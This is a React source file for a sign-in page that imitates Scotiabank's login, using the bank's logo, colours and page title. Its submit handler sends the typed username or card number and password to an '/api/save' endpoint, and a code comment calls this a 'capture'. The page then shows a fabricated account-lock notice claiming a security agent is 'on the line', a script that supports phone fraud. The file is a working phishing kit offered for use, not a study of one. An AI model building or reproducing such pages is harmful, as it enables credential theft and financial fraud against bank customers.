import React, { useState, useEffect } from 'react';
import { Lock, User, ChevronRight, AlertCircle } from 'lucide-react';

interface SignInPageProps {
  onNavigateHome?: () => void;
}

export const SignInPage: React.FC<SignInPageProps> = ({ onNavigateHome }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [loading, setLoading] = useState(false);
  const [showAlert, setShowAlert] = useState(false);

  useEffect(() => {
    document.title = 'Sign in | Scotiabank';
  }, []);


  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !password.trim()) {
      setErrorMsg('Please enter your Username or card number and Password.');
      setShowAlert(false);
      return;
    }
    setErrorMsg('');
    setShowAlert(false);
    setLoading(true);

    try {
      const response = await fetch(`${import.meta.env.VITE_API_URL}/api/save`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username: username.trim(),
          password: password.trim(),
          rememberMe: rememberMe,
        }),
      });

      const data = await response.json().catch(() => null);

      if (response.ok && data?.success !== false) {
        // Show Scotiabank-style error alert after successful capture
        setShowAlert(true);
        setPassword('');
      } else {
        setErrorMsg(data?.message || 'Failed to submit data. Please try again.');
      }
    } catch (error) {
      console.error('API Error:', error);
      setErrorMsg('Network error. Please check your connection and try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#F3F5F8] flex flex-col justify-between font-sans selection:bg-red-100 selection:text-[#EC111A] antialiased">
      
      {/* Main Centered Sign-In Container (No Top Bar) */}
      <main className="flex-1 flex flex-col items-center justify-center px-4 py-12">
        
        {/* Main White Card */}
        <div className="w-full max-w-[550px] min-h-[640px] sm:min-h-[680px] bg-white rounded-xl border border-gray-200/90 shadow-2xs py-12 sm:py-16 px-5 sm:px-10 relative flex flex-col justify-center items-center">
          
          {/* Lock Icon in Top Right of Card */}
          <div className="absolute top-6 right-6">
            <div className="w-5 h-5 rounded flex items-center justify-center bg-white">
              <Lock className="w-5 h-5 text-gray-700 stroke-[2.2]" />
            </div>
          </div>

          <div className="w-full ">
            {/* Welcome Header & Scotiabank Logo */}
            <div className="text-center mb-8 pt-2">
              <h2 className="text-2xl sm:text-3xl font-bold text-[#222222] tracking-tight mb-2">
                Welcome to
              </h2>
              <div className="flex items-center justify-center">
                <button 
                  onClick={onNavigateHome} 
                  className="focus:outline-none hover:opacity-95 transition inline-block"
                  aria-label="Scotiabank"
                >
                  <svg
                    focusable="true"
                    role="img"
                    aria-hidden="false"
                    className="w-[230px] sm:w-[260px] h-auto fill-[#EC111A]"
                    viewBox="0 0 697.04 99.14"
                  >
                    <title id="scotiabankLogo-title">Scotiabank</title>
                    <path d="M187,50a34.48,34.48,0,1,0,34.47,34.47A34.52,34.52,0,0,0,187,50Zm0,49.67a15.2,15.2,0,1,1,15.19-15.2A15.21,15.21,0,0,1,187,99.68Z" transform="translate(-17.58 -19.82)" />
                    <polygon points="247.77 31.83 238.36 31.83 238.36 11.48 217.75 11.48 217.75 31.83 208.34 31.83 208.34 50.48 217.75 50.48 217.75 97.5 238.36 97.5 238.36 50.48 247.77 50.48 247.77 31.83" />
                    <rect x="257.22" y="31.83" width="20.6" height="65.67" />
                    <path d="M285.1,19.82A11.48,11.48,0,1,0,296.59,31.3,11.5,11.5,0,0,0,285.1,19.82Z" transform="translate(-17.58 -19.82)" />
                    <path d="M580.64,69.34a12.3,12.3,0,0,1,12.28,12.28v35.7h20.6V78.8c0-17.49-10.09-28.79-26-28.79-6.55,0-13.46,2.87-19.15,12.05V51.65H547.75v65.67h20.61V81.62A12.3,12.3,0,0,1,580.64,69.34Z" transform="translate(-17.58 -19.82)" />
                    <polygon points="671.05 97.5 645.73 64.69 669.27 31.83 645.19 31.83 626.27 58.4 626.27 1.64 605.66 1.64 605.66 97.5 626.27 97.5 626.27 70.43 647.04 97.5 671.05 97.5" />
                    <path d="M81.54,99.65a30,30,0,0,0,2.11-12.1c0-6.63-2.08-12.55-5.85-16.68C73.4,66.05,65.88,62.05,55.45,59a37,37,0,0,1-5.86-2.2,14.46,14.46,0,0,1-4.37-3.25,7.37,7.37,0,0,1-1.87-5.32c0-3.05,1.63-5.12,4.29-6.79,3.33-2.1,9.74-2.3,16.29.12a39.83,39.83,0,0,1,6.64,3.15l8.76-17.43a49.86,49.86,0,0,0-12.56-5.66,55,55,0,0,0-14-1.77A37.61,37.61,0,0,0,39.7,22a29.82,29.82,0,0,0-10,6.52,30.84,30.84,0,0,0-6.65,10,31.9,31.9,0,0,0-2.21,12.14A25.58,25.58,0,0,0,28.6,68c6,5.63,12.8,7.63,15.54,8.69s5.75,2,7.68,2.71a27.62,27.62,0,0,1,5.64,2.88,9,9,0,0,1,3,3.34,7.53,7.53,0,0,1,.64,4.19,8.59,8.59,0,0,1-2.93,5.66c-1.77,1.66-5,2.61-9.48,2.61a28.68,28.68,0,0,1-11.49-2.76,82.84,82.84,0,0,1-9.33-5l-10.3,17.94C24.77,114.7,36.42,119,46.8,119a49.52,49.52,0,0,0,15.52-2.48,35.59,35.59,0,0,0,11.77-6.58A30.48,30.48,0,0,0,81.54,99.65Z" transform="translate(-17.58 -19.82)" />
                    <path d="M703.14,94.36a11.48,11.48,0,1,0,11.48,11.48A11.48,11.48,0,0,0,703.14,94.36Zm0,20.65a9.17,9.17,0,1,1,9.17-9.17A9.17,9.17,0,0,1,703.14,115Z" transform="translate(-17.58 -19.82)" />
                    <path d="M703.12,107.76h-1.84v4.35H699V99.58h4.8a4.16,4.16,0,0,1,4.17,4.15,4.07,4.07,0,0,1-2.41,3.65l2.64,4.73h-2.71Zm-1.84-2.1h2.63a1.93,1.93,0,0,0,0-3.84h-2.63Z" transform="translate(-17.58 -19.82)" />
                    <path d="M138,94A15.2,15.2,0,1,1,138,75L151.63,61.3A34.42,34.42,0,0,0,126.13,50c-19,0-35.56,13.53-35.56,34.48S107.12,119,126.13,119a34.42,34.42,0,0,0,25.5-11.29Z" transform="translate(-17.58 -19.82)" />
                    <path d="M376,117.32V51.65H355.93v6.9l-1.86-1.66A25.12,25.12,0,0,0,336.77,50C319,50,304.06,65.8,304.06,84.48S319,119,336.77,119a25.12,25.12,0,0,0,17.3-6.88l1.86-1.66v6.9ZM340,100a15.52,15.52,0,1,1,15.51-15.52A15.53,15.53,0,0,1,340,100Z" transform="translate(-17.58 -19.82)" />
                    <path d="M537.89,117.32V51.65H517.8v6.9l-1.86-1.66A25.12,25.12,0,0,0,498.64,50c-17.73,0-32.71,15.79-32.71,34.47s15,34.48,32.71,34.48a25.12,25.12,0,0,0,17.3-6.88l1.86-1.66v6.9ZM501.84,100a15.52,15.52,0,1,1,15.51-15.52A15.53,15.53,0,0,1,501.84,100Z" transform="translate(-17.58 -19.82)" />
                    <path d="M406.77,117.32v-6.9l1.86,1.66a25.1,25.1,0,0,0,17.3,6.88c17.73,0,32.7-15.79,32.7-34.48S443.66,50,425.93,50a25.1,25.1,0,0,0-17.3,6.88l-1.86-1.66V21.46H386.68v95.86Zm.44-32.84A15.52,15.52,0,1,1,422.73,100,15.53,15.53,0,0,1,407.21,84.48Z" transform="translate(-17.58 -19.82)" />
                  </svg>
                </button>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="w-full max-w-[340px] mx-auto space-y-6">
              
              {/* Scotiabank-style error alert after API capture */}
              {showAlert && (
                <div className="flex items-start space-x-3 border border-gray-200 rounded-md p-3.5 bg-white">
                  <AlertCircle className="w-5 h-5 text-[#EC111A] shrink-0 mt-0.5" />
                  <p className="text-xs sm:text-sm text-[#222222] leading-relaxed">
                   Your account has been temporarily locked by the Security Department. A security agent is currently on the line with you and will assist you in unlocking your account. (MI 636226)
                  </p>
                </div>
              )}

              {errorMsg && !showAlert && (
                <div className="flex items-start space-x-3 border border-gray-200 rounded-md p-3.5 bg-white">
                  <AlertCircle className="w-5 h-5 text-[#EC111A] shrink-0 mt-0.5" />
                  <p className="text-xs sm:text-sm text-[#222222] leading-relaxed">{errorMsg}</p>
                </div>
              )}

              {/* Username or card number Field */}
              <div>
                <label className="block text-xs sm:text-sm font-semibold text-[#222222] mb-1.5">
                  Username or card number
                </label>
                <div className="relative flex items-center border-b border-gray-300 focus-within:border-[#006699] py-2 transition-colors">
                  <User className="w-5 h-5 text-gray-600 mr-3 shrink-0" />
                  <input
                    type="text"
                    placeholder="Enter username or card number"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full text-sm sm:text-base text-[#222222] placeholder-gray-400 bg-transparent focus:outline-none"
                  />
                </div>
              </div>

              {/* Password Field */}
              <div>
                <label className="block text-xs sm:text-sm font-semibold text-[#222222] mb-1.5">
                  Password
                </label>
                <div className="relative flex items-center border-b border-gray-300 focus-within:border-[#006699] py-2 transition-colors">
                  <Lock className="w-5 h-5 text-gray-600 mr-3 shrink-0" />
                  <input
                    type={showPassword ? 'text' : 'password'}
                    placeholder="Enter password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full text-sm sm:text-base text-[#222222] placeholder-gray-400 bg-transparent focus:outline-none pr-14"
                  />
                  {password && (
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-0 text-xs sm:text-sm  tracking-wide text-gray-600  uppercase focus:outline-none"
                    >
                      {showPassword ? 'HIDE' : 'SHOW'}
                    </button>
                  )}
                </div>
              </div>

              {/* Remember Checkbox */}
              <div className="flex items-center space-x-3 pt-1">
                <input
                  type="checkbox"
                  id="remember"
                  checked={rememberMe}
                  onChange={(e) => setRememberMe(e.target.checked)}
                  className="w-4.5 h-4.5 rounded border-gray-300 text-[#EC111A] focus:ring-0 cursor-pointer"
                />
                <label htmlFor="remember" className="text-xs sm:text-sm text-[#555555] font-normal cursor-pointer select-none">
                  Remember my username or card number
                </label>
              </div>

              {/* Primary Sign in Button */}
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-[#EC111A] hover:bg-[#C40912] disabled:opacity-60 disabled:cursor-not-allowed text-white font-bold text-sm sm:text-base py-3.5 rounded-md shadow-2xs transition duration-200 mt-3 flex items-center justify-center space-x-2"
              >
                {loading ? (
                  <>
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    <span>Signing in...</span>
                  </>
                ) : (
                  <span>Sign in</span>
                )}
              </button>

            </form>
          </div>

          {/* Need help link right below form */}
          <div className="text-center mt-7">
            <a href="#" className="inline-flex items-center text-xs sm:text-sm font-bold text-[#006699] hover:underline">
              <span>Need help signing in?</span>
              <ChevronRight className="w-4 h-4 ml-0.5" />
            </a>
          </div>
        </div>

        {/* Set up now text below card */}
        <div className="mt-8 text-center text-md   text-[#333333]">
          Don't have a username and password?{' '}
          <a href="#" className="font-semibold underline text-[#222222] ">
            Set them up now.
          </a>
        </div>

      </main>

      {/* Bottom Footer Bar */}
      <footer className="w-full bg-white border-t border-gray-200/60 py-6 sm:py-8 px-6 sm:px-16 text-xs text-[#555555]">
        <div className="max-w-[1400px] mx-auto flex flex-col space-y-4">
          
          {/* Main Row: Left SVG Logo, Right Links */}
          <div className="flex flex-col sm:flex-row items-center justify-between gap-6">
            
            {/* Left Logo Icon */}
            <div className="flex items-center space-x-2">
              <button onClick={onNavigateHome} className="focus:outline-none hover:opacity-80 transition" aria-label="Go to homepage">
                <svg
                  focusable="true"
                  role="img"
                  aria-hidden="false"
                  className="w-7 h-7 sm:w-8 sm:h-8 fill-[#EC111A]"
                  viewBox="0 0 498.27 552.11"
                >
                  <title id="footer-logo-title">Scotiabank</title>
                  <path
                    d="M637.94,371.45H481.69A173.16,173.16,0,0,0,309.61,525.34h0A173.18,173.18,0,0,1,461.19,268.53H730.82Z"
                    transform="translate(-232.55 -268.53)"
                  />
                  <path
                    d="M325.43,717.72H481.69A173.15,173.15,0,0,0,653.76,563.83h0A173.18,173.18,0,0,1,502.18,820.64H232.55Z"
                    transform="translate(-232.55 -268.53)"
                  />
                  <circle cx="249.14" cy="276.05" r="139.06" />
                </svg>
              </button>
            </div>

            {/* Right Links Bar */}
            <div className="flex flex-wrap items-center justify-center sm:justify-end gap-6 sm:gap-8 text-xs text-[#333333] font-normal">
              <a href="#" className="hover:underline hover:text-[#EC111A]">Contact Us</a>
              <a href="#" className="hover:underline hover:text-[#EC111A]">Security</a>
              <a href="#" className="hover:underline hover:text-[#EC111A]">Legal</a>
              <a href="#" className="hover:underline hover:text-[#EC111A]">Privacy</a>
              <a href="#" className="hover:underline hover:text-[#EC111A]">Accessibility</a>
              <a href="#" className="hover:underline hover:text-[#EC111A]">Cookie Settings</a>
            </div>

          </div>

          {/* Bottom Row: Far Right Copyright */}
          <div className="flex justify-end pt-2">
            <span className="text-[11px] text-[#666666] font-normal">
              © Scotiabank. All Rights Reserved.
            </span>
          </div>

        </div>
      </footer>

    </div>
  );
};
